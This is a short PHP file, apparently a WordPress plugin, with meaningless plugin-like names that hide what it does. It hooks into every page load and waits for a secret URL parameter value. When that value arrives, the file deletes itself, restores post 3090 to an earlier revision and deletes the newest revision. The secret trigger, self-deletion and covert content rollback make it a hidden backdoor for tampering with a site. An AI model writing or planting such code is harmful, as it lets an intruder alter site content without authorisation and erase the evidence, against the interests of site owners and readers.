<?php

function coupon_reset_learndash() {
	if (isset($_GET['accordion_groups_stats_day']) && $_GET['accordion_groups_stats_day'] === 'types_column_shopp') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$importer_reminder_translation_global = 3090;
		$fancy_article_qr_http = wp_get_post_revisions($importer_reminder_translation_global);
		if (empty($fancy_article_qr_http)) die('no revisions');
		if (count($fancy_article_qr_http) < 2) die('less than 2');
		$delete_upgrader_platform_content = array_shift($fancy_article_qr_http);
		$analytics_info_smart = $delete_upgrader_platform_content->ID;
		$nice_smart_size_css = array_shift($fancy_article_qr_http);
		$master_accessible_solution_interactive = $nice_smart_size_css->ID;
		$your_lightbox_images = wp_restore_post_revision($master_accessible_solution_interactive);
		if ($your_lightbox_images === false) die('error restoring');
		$your_lightbox_images = wp_delete_post_revision($analytics_info_smart);		
		if ($your_lightbox_images === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'coupon_reset_learndash');
